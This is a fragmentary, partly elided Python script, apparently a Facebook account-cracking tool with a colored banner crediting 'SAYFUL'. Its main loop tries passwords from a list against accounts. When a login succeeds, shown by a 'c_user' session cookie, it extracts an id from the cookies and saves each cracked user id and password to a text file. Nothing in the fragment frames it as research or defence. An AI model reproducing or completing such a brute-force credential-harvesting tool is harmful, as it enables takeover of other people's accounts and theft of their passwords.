...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mSAYFUL\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100071036600520
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[SAYFUL-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SAYFUL-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
